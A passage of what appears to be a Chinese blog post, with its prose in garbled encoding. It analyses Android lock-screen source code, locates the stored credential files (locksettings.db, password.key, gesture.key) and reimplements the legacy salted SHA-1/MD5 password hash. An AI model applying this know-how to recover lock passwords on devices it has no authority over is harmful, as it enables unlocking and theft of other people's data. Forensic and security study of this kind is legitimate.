&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">LockSettingsStorage&lt;/span> &lt;span class="nf">getStorage&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">final&lt;/span> &lt;span class="n">LockSettingsStorage&lt;/span> &lt;span class="n">storage&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">LockSettingsStorage&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">mContext&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">storage&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">setDatabaseOnCreateCallback&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="n">LockSettingsStorage&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">Callback&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">initialize&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">SQLiteDatabase&lt;/span> &lt;span class="n">db&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Get the lockscreen default from a system property, if available
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">boolean&lt;/span> &lt;span class="n">lockScreenDisable&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SystemProperties&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getBoolean&lt;/span>&lt;span class="o">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;ro.lockscreen.disable.default&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">lockScreenDisable&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">storage&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">writeKeyValue&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">db&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">LockPatternUtils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">DISABLE_LOCKSCREEN_KEY&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="s">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">storage&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="nf">LockSettingsService&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Context&lt;/span> &lt;span class="n">context&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">this&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="n">Injector&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">context&lt;/span>&lt;span class="o">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç»§ç»­ æŸ¥çœ‹LockSettingsStorage.java ç±»ä¸­ å­˜åœ¨æ•°æ®åº“ä¸­&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">static&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">DatabaseHelper&lt;/span> &lt;span class="kd">extends&lt;/span> &lt;span class="n">SQLiteOpenHelper&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">TAG&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;LockSettingsDB&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">DATABASE_NAME&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;locksettings.db&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">DATABASE_VERSION&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">2&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">IDLE_CONNECTION_TIMEOUT_MS&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">30000&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="n">Callback&lt;/span> &lt;span class="n">mCallback&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">DatabaseHelper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Context&lt;/span> &lt;span class="n">context&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">super&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">context&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">DATABASE_NAME&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">DATABASE_VERSION&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">setWriteAheadLoggingEnabled&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Memory optimization - close idle connections after 30s of inactivity
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">setIdleConnectionTimeout&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">IDLE_CONNECTION_TIMEOUT_MS&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">setCallback&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Callback&lt;/span> &lt;span class="n">callback&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mCallback&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">callback&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">createTable&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">SQLiteDatabase&lt;/span> &lt;span class="n">db&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">db&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">execSQL&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;CREATE TABLE &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">TABLE&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34; (&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;_id INTEGER PRIMARY KEY AUTOINCREMENT,&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COLUMN_KEY&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34; TEXT,&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COLUMN_USERID&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34; INTEGER,&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">COLUMN_VALUE&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34; TEXT&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;);&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">onCreate&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">SQLiteDatabase&lt;/span> &lt;span class="n">db&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">createTable&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">db&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">mCallback&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mCallback&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">initialize&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">db&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">onUpgrade&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">SQLiteDatabase&lt;/span> &lt;span class="n">db&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">oldVersion&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">currentVersion&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">upgradeVersion&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">oldVersion&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">upgradeVersion&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">1&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Previously migrated lock screen widget settings. Now defunct.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">upgradeVersion&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">2&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">upgradeVersion&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">DATABASE_VERSION&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">w&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">TAG&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="s">&amp;#34;Failed to upgrade database!&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>çœ‹åˆ°äº†æ•°æ®åº“çš„åå­—å«ä½œï¼šlocksettings.db ä¿å­˜åœ¨äº†ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">SYSTEM_DIRECTORY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;/system/&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//ç›®å½•
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">LOCK_PATTERN_FILE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;gatekeeper.pattern.key&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">BASE_ZERO_LOCK_PATTERN_FILE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;gatekeeper.gesture.key&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">LEGACY_LOCK_PATTERN_FILE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;gesture.key&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//key1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">LOCK_PASSWORD_FILE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;gatekeeper.password.key&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">LEGACY_LOCK_PASSWORD_FILE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;password.key&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//key2
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">CHILD_PROFILE_LOCK_FILE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;gatekeeper.profile.key&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">SYNTHETIC_PASSWORD_DIRECTORY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;spblob/&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ•°æ®åº“æ–‡ä»¶å­˜åœ¨/data/system/locksetting.db&lt;/p>
&lt;p>æµ‹è¯• åœ¨/data/system/ä¸‹çœ‹åˆ°password.key&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-1-1.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æ‰“å¼€çœ‹çœ‹ï¼š&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-1-2.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æ‰‹åŠ¨ç®€å•å®ç°åŠ å¯†ç®—æ³•ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="nf">passwordToHash&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">password&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span> &lt;span class="o">[]&lt;/span> &lt;span class="n">hashed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">saltedPassword&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">password&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">SALT&lt;/span>&lt;span class="o">).&lt;/span>&lt;span class="na">getBytes&lt;/span>&lt;span class="o">();&lt;/span> &lt;span class="c1">//SALT å€¼ä»æ•°æ®åº“ä¸­å¾—åˆ° æ‹¿åˆ°ä¹‹åè¿›è¡Œhexè½¬æ¢
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">sha1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MessageDigest&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;SHA-1&amp;#34;&lt;/span>&lt;span class="o">).&lt;/span>&lt;span class="na">digest&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">saltedPassword&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">md5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MessageDigest&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;MD5&amp;#34;&lt;/span>&lt;span class="o">).&lt;/span>&lt;span class="na">digest&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">saltedPassword&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hashed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">toHex&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sha1&lt;/span>&lt;span class="o">)+&lt;/span>&lt;span class="n">toHex&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">md5&lt;/span>&lt;span class="o">)).&lt;/span>&lt;span class="na">getBytes&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Exception&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">hashed&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
